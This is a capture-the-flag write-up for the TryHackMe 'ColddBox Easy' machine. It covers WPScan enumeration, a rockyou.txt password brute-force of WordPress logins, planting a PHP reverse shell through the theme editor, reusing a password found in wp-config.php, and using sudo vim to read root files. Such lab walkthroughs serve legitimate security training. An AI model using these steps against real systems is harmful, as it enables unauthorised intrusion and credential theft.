---

Name: ColddBox Easy
Difficulty: Easy
URL: https://tryhackme.com/room/colddboxeasy
Description: An easy level machine with multiple ways to escalate privileges. By Hixec.

---

Let's start by checking the running services:

```bash
$ rustscan -a coldd.thm -r 1-65535 --ulimit 5000 -- -sC -sV

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine

4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
```

We have:

* `80` - HTTP
* `4512` - SSH

Visiting the website shows that it is running WordPress:

```text
Proudly powered by WordPress
```

Let's use WPScan to enumerate the WordPress installation:

```bash
$ wpscan --url http://coldd.thm/ --enumerate u,vp,vt --api-token REDACTED --disable-tls-checks
```

We find an old WordPress version:

```text
[+] WordPress version 4.1.31 identified (Insecure)
```

WPScan also reports several vulnerabilities, including an SQL injection vulnerability:

```text
[!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
    Fixed in: 4.1.34
    CVE: CVE-2022-21661
```

It also finds several users:

```text
[+] the cold in person
[+] philip
[+] c0ldd
[+] hugo
```

Let's try to brute-force their passwords using `rockyou.txt`:

```bash
$ wpscan --url http://coldd.thm/ --passwords /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210
```

We can now log in to WordPress as `c0ldd`.

Since we have access to the theme editor, we can replace a PHP file with a reverse shell.

I chose:

```text
Twenty Fifteen: Main Index Template (index.php)
```

I generated a PHP PentestMonkey reverse shell using [revshells](https://www.revshells.com/).

I then started a listener:

```bash
nc -lvnp 4444
```

After saving the modified `index.php`, I visited:

```text
http://coldd.thm/
```

We get a shell as `www-data`:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Getting a user shell

Looking through the WordPress files, we find `wp-config.php`:

```bash
$ cat wp-config.php

define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
```

We can use these credentials to access the database:

```bash
$ mysql -u c0ldd -p
```

The database contains the WordPress tables, including `wp_users`:

```sql
MariaDB [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| colddbox           |
| information_schema |
+--------------------+

MariaDB [(none)]> use colddbox;

MariaDB [colddbox]> show tables;

+-----------------------+
| Tables_in_colddbox    |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
```

Let's look at the WordPress users:

```sql
MariaDB [colddbox]> select * from wp_users;
```

We find hashes for the users `c0ldd`, `hugo`, and `philip`.

More importantly, we already found a plaintext password in `wp-config.php`:

```text
c0ldd : cybersecurity
```

Since password reuse is possible, let's try it for the Linux user `c0ldd`:

```bash
$ su c0ldd
Password: cybersecurity
```

It works.

We are now `c0ldd`:

```bash
c0ldd@ColddBox-Easy:~$ id
uid=1000(c0ldd) gid=1000(c0ldd) groups=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

---

## Privilege Escalation

Let's check what we can run with `sudo`:

```bash
c0ldd@ColddBox-Easy:~$ sudo -l

User c0ldd may run the following commands:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

We can run `vim` as root.

Instead of getting a full root shell, we can simply use Vim to read the root flag:

```bash
sudo vim /root/root.txt
```

The root flag is displayed in Vim.
